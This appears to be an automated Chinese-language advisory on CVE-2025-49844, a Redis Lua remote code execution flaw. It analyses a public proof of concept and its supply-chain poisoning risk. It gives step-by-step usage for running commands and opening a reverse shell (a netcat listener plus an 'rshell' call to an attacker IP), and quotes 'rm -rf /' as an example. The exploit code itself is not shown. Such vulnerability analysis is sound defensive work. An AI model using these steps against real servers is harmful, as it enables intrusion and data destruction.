## CVE-2025-49844 - Redis 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-49844

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Redis

**危害等级:** 高

**CVSS评分:** 未提供

**影响版本:** Redis 8.2.1-alpine Docker image (x86-64 Linux), Redis 8.2.1-bookworm Docker image (x86-64 Linux)

**利用条件:** 需要网络访问, 默认配置下可能无需认证

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5

## 详情

POC有效性分析:
该POC针对CVE-2025-49844（也称为RediShell），是一个针对Redis服务器的远程代码执行漏洞。`README.md`文件明确指出，这个POC由个人开发者实现，已成功在`x86-64 Linux redis:8.2.1-alpine`和`redis:8.2.1-bookworm` Docker镜像上验证。这表明POC具有高度的有效性和针对性，能够可靠地在指定目标环境下重现并利用漏洞。

`pyproject.toml`文件显示项目依赖于`hexdump`、`iced-x86`和`redis`等标准库，这些库在安全工具开发中常见，用于处理二进制数据、汇编分析及Redis交互，进一步证实了POC的专业性和功能完整性。

核心利用逻辑体现在`demonstration.py`中。该脚本通过Python的`redis`客户端库连接到目标Redis服务器（默认连接到`127.0.0.1:6379`，且`password=None`表明在未认证或默认配置下可尝试利用）。脚本执行一段精心构造的Lua脚本，利用Redis Lua解释器中的内存管理漏洞（可能涉及垃圾回收和字符串处理），通过`loadstring`、`collectgarbage("collect")`以及对`__redis__err__handler().source`的操纵，最终实现控制程序执行流或泄露敏感信息，进而导致远程代码执行。`r.script_flush('SYNC')`的操作确保内存状态的一致性，提高利用的可靠性。脚本执行后，根据返回结果判断chunkname是否被成功替换，这是利用成功的关键标志。

`README.md`中给出的使用示例，包括直接执行系统命令（如`echo 'hello world' > /data/hello.txt`）和建立反向shell（如`rshell -l 127.0.0.1 -p 4444`），明确证实该POC实现了完整的远程代码执行能力，而不仅仅是概念验证。它将复杂的内存操作和Lua脚本注入封装成简单的命令行接口，极大降低了攻击者利用此漏洞的门槛。该POC是一个功能齐全且经过验证的远程代码执行工具。

利用步骤:
要利用此POC，攻击者需满足以下条件：
1.  **目标环境**：一个运行中的Redis服务器，版本为`8.2.1`（特别是在`x86-64 Linux`环境下的`alpine`或`bookworm` Docker镜像）。
2.  **网络可达性**：攻击者能够通过网络连接到目标Redis服务器的6379端口。POC代码中`password=None`暗示在默认无密码认证或弱认证环境下即可利用。
3.  **攻击者环境**：攻击者的机器上需要安装`uv`（一个Python包安装和管理工具），并安装`pyproject.toml`中列出的Python依赖。

具体的利用步骤如下：
1.  **准备环境**：
    *   在攻击者的系统上安装`uv`。
    *   将POC代码保存到本地目录。
2.  **安装依赖**：
    *   进入POC目录。
    *   使用`uv install`安装项目依赖。
3.  **执行命令**：
    *   **执行一次性命令**：`uv run cve-2025-49844 command "您希望在目标上执行的系统命令"`。例如：`uv run cve-2025-49844 command "id"`。
    *   **建立反向Shell**：首先，攻击者机器上开启监听，例如`nc -lvnp 4444`。然后执行POC：`uv run cve-2025-49844 rshell -l 攻击者监听IP -p 攻击者监听端口`。

投毒风险分析:
对于CVE-2025-49844的POC代码，我们从专业的防御性安全研究角度对其投毒风险进行评估，得出结论为**低风险（5%）**。以下是详细分析：

首先，代码的透明度和可读性是评估投毒风险的关键因素。这个POC由Python编写，核心逻辑位于`demonstration.py`中。该文件代码清晰，没有明显的混淆、加密或难以理解的结构。其主要功能是构建和执行一个恶意的Lua脚本，以利用Redis服务器的漏洞。这段Lua脚本虽然复杂，涉及到内存管理和垃圾回收机制，但其目的是触发漏洞，而不是在POC使用者本地执行恶意操作。`pyproject.toml`文件明确列出了项目依赖，包括`hexdump`, `iced-x86`, `redis`。这些都是开源且被广泛使用的安全分析和网络通信库，没有已知恶意行为。攻击者在使用这些库时，通常会从官方源下载，降低了供应链投毒的风险。

其次，我们关注POC代码的执行流程。`README.md`中给出的`uv run`命令是标准的Python项目执行方式，`uv`作为一个包管理和执行工具，其行为是可预测和受控的。POC本身的主要功能是连接到指定的Redis服务器，并向其发送精心构造的Lua脚本。这个过程的目标是**远程目标服务器**，而非执行POC的本地机器。POC代码中没有发现任何尝试下载并执行外部可疑脚本、修改本地系统配置、收集敏感信息并回传、或者进行加密挖矿等恶意行为。

值得注意的是，POC提供的`command`和`rshell`功能允许用户指定要在**远程目标服务器**上执行的命令或反向shell连接的地址和端口。这部分功能是漏洞利用的**核心目的**，而非POC代码本身的投毒。换句话说，POC的设计意图就是为了让用户能够在远程Redis服务器上执行任意代码。如果用户选择执行一个恶意命令（例如：`uv run cve-2025-49844 command "rm -rf /"`），这确实会给远程目标带来巨大风险，但这源于用户的输入，而非POC代码本身被“投毒”。POC作为安全研究工具，其职责是展示漏洞的利用能力，并提供攻击者可以自定义的载荷接口。

总结来说，该POC代码在结构上是透明的，依赖项是合法的，并且其执行流程明确指向远程目标，没有在本地系统上发现额外的恶意行为。因此，我们判定其作为研究工具的投毒风险极低。5%的风险主要是考虑到即使是合法工具，也存在极小的可能被在构建或发布过程中注入恶意代码（供应链攻击），或者误用导致用户本地环境出现非预期问题，但这些并非代码本身固有的恶意设计。防御者可以放心地使用该POC进行复现和验证，前提是要在受控环境中进行，并理解其对远程目标系统的潜在影响。

**项目地址:** N/A

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-49844
